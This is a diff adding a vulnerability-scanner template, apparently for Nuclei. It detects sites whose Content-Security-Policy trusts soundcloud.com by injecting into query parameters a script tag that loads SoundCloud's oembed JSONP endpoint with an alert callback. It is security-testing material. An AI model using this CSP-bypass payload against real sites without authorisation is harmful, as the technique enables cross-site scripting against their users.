@@ -1,0 +1,55 @@
+id: soundcloud-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - SoundCloud
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,soundcloud
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "soundcloud.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: soundcloud_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://soundcloud.com/oembed?format=js&callback=alert&url=https://soundcloud.com/rich-the-kid/plug-walk-1"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "soundcloud_csp_xss == true"
+# digest: 4a0a00473045022100fc931aad3674f910ca0b641dc649589645873c2f050b2b2fff56ce0596a9468902205cefa945caf4367f7d34b0fe8921ce452e92ba69f106db91a0dc6ea7813597e1:922c64590222798bb761d5b6d8e72950
